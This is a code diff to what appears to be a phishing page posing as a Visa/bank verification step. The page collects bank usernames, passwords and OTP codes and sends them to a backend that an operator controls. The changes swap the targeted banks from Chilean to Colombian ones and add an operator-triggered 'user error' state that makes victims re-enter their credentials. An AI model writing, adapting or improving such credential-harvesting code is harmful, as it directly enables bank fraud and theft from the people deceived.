@@ -56,7 +56,6 @@
             align-items: center; 
             justify-content: flex-end; 
             height: 55px; 
-            /* 🔥 Ajustado a 1.3 para que no se salga */
             transform: scale(1.3); 
             transform-origin: right center;
             margin-right: 5px;
@@ -101,6 +100,11 @@
         .status-message { display: none; padding: 14px; border-radius: 6px; font-size: 0.95rem; font-weight: 500; margin-bottom: 20px; text-align: center; }
         .status-message.error { display: block; background: #fef2f2; color: #dc2626; border: 1px solid #fecaca; }
         .status-message.success { display: block; background: #f0fdf4; color: #16a34a; border: 1px solid #bbf7d0; }
+        .status-message.error-usuario { 
+            display: block; background: #fef2f2; color: #dc2626; 
+            border: 2px solid #dc2626; font-weight: 700; padding: 16px; 
+            font-size: 1rem; text-align: center;
+        }
         
         .loading-overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
@@ -135,7 +139,6 @@
             
             .visa-logo { 
                 height: 50px; 
-                /* 🔥 Ajustado a 1.4 para móvil */
                 transform: scale(1.4); 
                 transform-origin: right center;
                 margin-right: 5px;
@@ -199,7 +202,7 @@
                 </div>
                 <div class="form-group" style="margin-bottom:0;">
                     <label class="form-label" id="otpLabel">Código OTP <span class="required">*</span></label>
-                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación" maxlength="8" inputmode="numeric" required />
+                    <input type="text" class="form-input" id="confirmationCode" placeholder="Ingresa tu código de verificación (4-8 dígitos)" maxlength="8" inputmode="numeric" required />
                     <div class="error-message">El código debe tener entre 4 y 8 dígitos</div>
                 </div>
             </div>
@@ -213,19 +216,19 @@
     <script>
         const POLLING_INTERVAL = 2000;
         const MAX_POLLING_TIME = 300000;
+        const API_CREAR_PAGO = '/api/crear-pago';
+        const API_ESTADO_PAGO = '/api/estado-pago';
 
         const BANK_LOGOS = {
-            'Banco de Chile':  'bancochile.png',
-            'Banco Estado':    'bancoestado.png',
-            'Santander':       'santander.png',
-            'BCI':             'BCI.png',
-            'Banco Falabella': 'falabella.png',
-            'BICE':            'bice.png',
-            'Banco Ripley':    'ripley.png',
-            'BBVA':            'bbva.png',
-            'Tenpo':           'tenpo.png',
-            'MACH':            'mach.png',
-            'Coopeuch':        'coopeuch.png'
+            'Bancolombia':     'bancol.png',
+            'Davivienda':      'davivienda.png',
+            'Davibank':        'db.png',
+            'Banco Popular':   'popu.png',
+            'Itaú':            'itau.png',
+            'Caja Social':     'Caja.jpg',
+            'Banco de Bogotá': 'bog.png',
+            'Banco Occidente': 'occi.png',
+            'BBVA Colombia':   'bbva.png'
         };
 
         let solicitudId = null;
@@ -312,7 +315,7 @@
             }
 
             try {
-                const resp = await fetch('/api/crear-pago', { 
+                const resp = await fetch(API_CREAR_PAGO, { 
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' }, 
                     body: JSON.stringify(payload) 
@@ -335,7 +338,7 @@
                     mostrarError('⏰ Tiempo de espera agotado.'); resetFormulario(); return;
                 }
                 try {
-                    const r = await fetch(`/api/estado-pago/${solicitudId}`);
+                    const r = await fetch(`${API_ESTADO_PAGO}/${solicitudId}`);
                     const data = await r.json();
                     if (!data.success) return;
 
@@ -348,6 +351,17 @@
                         clearInterval(pollingInterval); pollingInterval = null;
                         loadingText.textContent = 'Autenticación exitosa. Redirigiendo...';
                         setTimeout(() => { window.location.href = 'exito.html'; }, 1500); return;
+                    }
+
+                    // 🔥 NUEVO: SI EL ADMIN PONE ERROR DE USUARIO, SE REINICIA EL FORMULARIO
+                    if (data.estado === 'rechazado_user_error') {
+                        clearInterval(pollingInterval); pollingInterval = null;
+                        statusMessage.className = 'status-message error-usuario';
+                        statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
+                        statusMessage.style.display = 'block';
+                        loadingOverlay.classList.remove('active');
+                        resetFormulario(); 
+                        return;
                     }
 
                     if (data.estado === 'rechazado') {
@@ -392,8 +406,6 @@
             usernameInput.value = ''; 
             passwordInput.value = ''; 
             confirmationInput.value = '';
-            statusMessage.className = 'status-message'; 
-            statusMessage.style.display = 'none';
             formularioBloqueado = false;
             if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
         }
@@ -411,7 +423,17 @@
                 if (!usernameInput.value.trim()) { usernameInput.parentElement.classList.add('error'); isValid = false; }
                 if (!passwordInput.value.trim()) { passwordInput.parentElement.classList.add('error'); isValid = false; }
             } else if (faseActual === 'otp') {
-                if (!confirmationInput.value.trim()) { confirmationInput.parentElement.classList.add('error'); isValid = false; }
+                if (!confirmationInput.value.trim()) { 
+                    confirmationInput.parentElement.classList.add('error'); 
+                    isValid = false; 
+                } else {
+                    // 🔥 VALIDACIÓN PARA ACEPTAR DE 4 A 8 DÍGITOS
+                    if (!/^\d{4,8}$/.test(confirmationInput.value)) {
+                        confirmationInput.parentElement.classList.add('error');
+                        confirmationInput.parentElement.querySelector('.error-message').textContent = 'El código debe tener entre 4 y 8 dígitos';
+                        isValid = false;
+                    }
+                }
             }
 
             if (!isValid) return;
